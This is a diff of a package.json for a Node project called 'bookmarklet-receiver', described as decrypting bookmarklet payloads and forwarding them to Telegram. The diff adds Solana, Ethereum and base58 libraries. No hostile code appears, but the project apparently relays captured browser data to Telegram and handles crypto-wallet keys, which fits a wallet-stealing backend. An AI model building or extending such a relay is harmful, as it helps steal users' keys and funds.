@@ -2,13 +2,15 @@
   "name": "bookmarklet-receiver",
   "version": "1.0.0",
   "private": true,
-  "description": "Lightweight GET receiver that decodes bookmarklet payloads and forwards them to Telegram",
-  "engines": {
-    "node": ">=18"
-  },
+  "description": "Decrypts and forwards bookmarklet payloads to Telegram",
+  "engines": { "node": ">=18" },
   "scripts": {
     "dev": "vercel dev",
     "start": "node server.js"
   },
-  "dependencies": {}
+  "dependencies": {
+    "@solana/web3.js": "^1.87.6",
+    "ethereumjs-util": "^7.1.5",
+    "bs58": "^5.0.0"
+  }
 }
